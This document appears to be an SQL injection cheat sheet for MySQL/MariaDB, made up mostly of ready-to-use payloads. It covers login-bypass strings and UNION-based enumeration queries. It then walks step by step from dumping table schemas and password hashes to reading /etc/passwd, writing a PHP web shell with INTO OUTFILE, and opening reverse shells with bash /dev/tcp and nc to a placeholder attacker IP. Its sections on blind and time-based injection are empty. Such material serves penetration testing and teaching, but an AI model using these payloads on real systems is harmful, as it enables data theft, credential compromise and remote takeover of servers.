\033[0;34m##################################################################################
\033[1;35m=== MySQL (MariaDB) ===\033[0m
https://dev.mysql.com/doc/refman/8.0/en/functions.html

\033[0;31m- ENTRY-POINT DETECTION -\033[0m
\033[0;31mURL-ENCODED     ASCII
-------------------------\033[0m
%27             '
%22             "
%23             #
%3B             ;
%29             )
%2A             *
%26apos         &apos
\033[0;31m-------------------------\033[0m

\033[0;31m- MULTIPLE ENCODING -\033[0m
%27%27
%25%27

\033[0;31m- ENCODED SPACES -\033[0m
+
${IFS}
%20

\033[0;31m- ERROR-BASED PAYLOADS -\033[0m
\033[0;31mLogin bypass:
(start in the second row, second column?)\033[0m
' or 1=1 LIMIT 1,1 #

' or 1=1 #

\033[0;31mDatabase enumeration:
(assumes we have information about the database such as table 'users', column 'password' etc..)\033[0m
' or 1=1 in (SELECT * FROM users) #
' or 1=1 in (SELECT password FROM users) #
' or 1=1 in (SELECT password FROM users WHERE username='admin') #

\033[0;31m- UNION-BASED PAYLOADS -\033[0m
\033[0;31m[1] (detect the number of columns)\033[0m
' OR 1=1 ORDER by 1 #
' OR 1=1 ORDER by 2 #
' OR 1=1 ORDER by 3 #
etc...

\033[0;31m[2] (detect the number of columns)\033[0m
' OR 1=1 UNION SELECT null #
' OR 1=1 UNION SELECT null,null #
' OR 1=1 UNION SELECT null,null,null #
' UNION SELECT null #
' UNION SELECT null,null #
' UNION SELECT null,null,null #
etc...

\033[0;31m(assumes we have detected 3 columns)\033[0m
' OR 1=1 UNION SELECT 1,2,3 #
' OR 1=1 UNION SELECT 1,2,version() #
' OR 1=1 UNION SELECT 1,2,@@version #
' OR 1=1 UNION SELECT user(),database(),@@version #

\033[0;31m(the following shows an example of a series of exploits leading up to a reverse shell)
---------------------------------------------------------------------------------------------------------
(detect schemas, tables, and columns (assumes we have detected the amount of columns) )\033[0m
\033[1;31mSTEP 1.\033[0m

\033[0;31mCODE:\033[0m
' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns #

\033[0;31mEXAMPLE RESULT (from the command above):\033[0m\033[0;97m
|-------------------|-------------------|-----------------|
|information_schema |ALL_PLUGINS        |PLUGIN_NAME      |
|information_schema |ALL_PLUGINS        |PLUGIN_VERSION   |
|information_schema |ALL_PLUGINS        |etc...           |
|performance_schema |cond_instances     |NAME             |
|performance_schema |cond_instances     |etc...           |
|webdb              |users              |id               |
|webdb              |users              |email            |
|webdb              |users              |username         |
|webdb              |users              |password         |
|webdb              |users              |IsAdmin          |
|webdb              |users              |etc...           |
|-------------------|-------------------|-----------------|
\033[0m

\033[0;31m(exclude unwanted information from detected schemas, tables, and columns)\033[0m
\033[1;31mSTEP 2.\033[0m

\033[0;31mCODE:\033[0m
' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA != "information_schema" AND TABLE_SCHEMA != "performance_schema" #

\033[0;31mEXAMPLE RESULT (from the command above):\033[0m\033[0;97m
|-------------------|-------------------|-----------------|
|webdb              |users              |id               |
|webdb              |users              |email            |
|webdb              |users              |username         |
|webdb              |users              |password         |
|webdb              |users              |IsAdmin          |
|webdb              |users              |etc...           |
|-------------------|-------------------|-----------------|
\033[0m

\033[0;31m(select specific data)\033[0m
\033[1;31mSTEP 3.\033[0m

\033[0;31mCODE:\033[0m
' UNION SELECT username,password,email FROM webdb.users #

\033[0;31mEXAMPLE RESULT (from the command above):\033[0m\033[0;97m
|-------------------|-------------------|-----------------|
|Id                 |Name               |Email            |
|-------------------|-------------------|-----------------|
|admin              |8bab434138ebcc...  |admin@localhost  |
|web                |fc7dfcadeec2bc...  |web@vulnwebapp   |
|john               |58c2bd8aef9928...  |john@vulnwebapp  |
|-------------------|-------------------|-----------------|
\033[0m

\033[1;31mSTEP 4\033[0m \033[0;31m(optional if we want to get a reverse shell via MySQL "check for privs"). 
(using <' UNION SELECT user(),null,null #> we can determine that "web" is the MySQL user running the commands)\033[0m

\033[0;31mCODE:\033[0m
' UNION SELECT File_priv,2,3 FROM mysql.user WHERE user="web" #

\033[0;31mEXAMPLE RESULT (from the code above):
("web" has File_priv 'Y' which means we can read files)\033[0m\033[0;97m
|-------------------|-------------------|-----------------|
|Id                 |Name               |Email            |
|-------------------|-------------------|-----------------|
|Y                  |2                  |3                |
|-------------------|-------------------|-----------------|
\033[0m

\033[0;31mCODE:\033[0m
' UNION SELECT @secure_file_priv,2,3 #

\033[0;31mEXAMPLE RESULT (from the code above):
(if no NULL is returned for @secure_file_priv it means "web" has file read/write outside of the database)\033[0m\033[0;97m
|---|---------|---------|
|Id |Name     |Email    |
|---|---------|---------|
|   |2        |3        |
|---|---------|---------|
\033[0m

\033[1;31mSTEP 5 \033[0m \033[0;31m(abuse the permissions to read files).\033[0m

\033[0;31mCODE:\033[0m
' UNION SELECT load_file('/etc/passwd'),2,3 #

\033[0;31mEXAMPLE RESULT (from the code above):\033[0m\033[0;97m
|---------------------------------------|-------------------|-----------------|
|Id                                     |Name               |Email            |
|---------------------------------------|-------------------|-----------------|
|root:x:0:0::/root:/bin/bash            |2                  |3                | 
|bin:x:1:1::/:/usr/bin/nologin          |                   |                 |
|daemon:x:2:2::/:/usr/bin/nologin       |                   |                 |
|.                                      |                   |                 |
|.                                      |                   |                 |
|web:x:1000:1000::/home/web:/bin/bash   |                   |                 | 
|---------------------------------------|-------------------|-----------------|
\033[0m

\033[0;31m\033[1;31mSTEP 6\033[0m \033[0;31m(abuse the permissions to write files).\033[0m

\033[0m\033[0;31mCODE:\033[0m
' UNION SELECT "<?php passthru($_GET['cmd']); ?>",2,3 INTO OUTFILE '/var/www/html/WebApp/shell.php' #

\033[1;31mSTEP 7\033[0m \033[0;31m(visit the URI for the shell).\033[0m

http://<192.168.1.1>/<WebApp>/shell.php?cmd=id
uid=33(www-data)gid=33(www-data)groups=33(www-data)2 3

http://<192.168.1.1>/<WebApp>/shell.php?cmd=bash%20-c%20'bash%20-i%20>&%20/dev/tcp/<attacker_ip>/<port> 0>&1'
http://<192.168.1.1>/<WebApp>/shell.php?cmd=nc%20-e%20/bin/bash%20<attacker_ip>%20<port>
...
\033[0;31m
(end of example series)
---------------------------------------------------------------------------------------------------------\033[0m


\033[0;31m- BLIND-BASED PAYLOADS -\033[0m
.
.

\033[0;31m- TIME-BASED PAYLOADS -\033[0m
.
.

\033[0;34m##################################################################################
\033[1;35m=== other database technology ===\033[0m
.
.
.
\033[0;34m##################################################################################
\n
